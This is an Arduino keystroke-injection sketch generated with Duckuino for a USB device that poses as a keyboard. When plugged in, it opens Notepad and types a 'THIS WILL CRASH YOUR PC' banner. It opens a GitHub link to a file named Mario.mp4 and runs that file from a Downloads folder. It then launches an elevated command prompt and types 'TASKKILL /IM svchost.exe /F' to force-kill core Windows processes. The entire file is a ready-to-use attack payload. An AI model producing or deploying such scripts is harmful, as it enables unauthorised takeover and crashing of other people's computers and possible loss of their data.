/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(300);
  Keyboard.print(F("notepad"));

  delay(300);
  typeKey(KEY_RETURN);

  delay(300);
  Keyboard.print(F("DOWNLOAD THIS FIRST PUT IT IN C:\\Users\\YOURUSER\\Downloads"));

  delay(800);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(300);
  Keyboard.print(F("https://github.com/Blas1ed/IGNORE_THIS/blob/main/Mario.mp4"));

  delay(600);
  typeKey(KEY_RETURN);

  delay(10000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(300);
  Keyboard.print(F("notepad"));

  delay(300);
  typeKey(KEY_RETURN);

  delay(300);
  Keyboard.print(F(" ____________________"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("/    THIS WILL       \\"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("!     CRASH          !"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("!    YOUR PC         !"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("\\____________________/"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("         !  !"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("         !  !"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("         L_ !"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("        / _)!"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("       / /__L"));

  typeKey(KEY_RETURN);

  Keyboard.print(F(" _____/ (____)"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("        (____)"));

  typeKey(KEY_RETURN);

  Keyboard.print(F(" _____  (____)"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("      \\_(____)"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("         !  !"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("         !  !"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("         \\__/"));

  delay(4000);
  typeKey(KEY_LEFT_ALT);

  delay(500);
  Keyboard.print(F("F"));

  delay(300);
  Keyboard.print(F("X"));

  delay(300);
  typeKey(KEY_RIGHT_ARROW);

  delay(300);
  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(300);
  Keyboard.print(F("C:\\Users\\jacob\\Downloads\\Mario.mp4"));

  delay(500);
  typeKey(KEY_RETURN);

  delay(7500);
  typeKey(KEY_LEFT_GUI);

  delay(300);
  Keyboard.print(F("cmd"));

  delay(300);
  typeKey(KEY_RIGHT_ARROW);

  delay(300);
  typeKey(KEY_DOWN_ARROW);

  delay(300);
  typeKey(KEY_RETURN);

  delay(1500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('y');
  Keyboard.releaseAll();

  delay(500);
  Keyboard.print(F("TASKKILL /IM svchost.exe /F"));

  delay(300);
  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
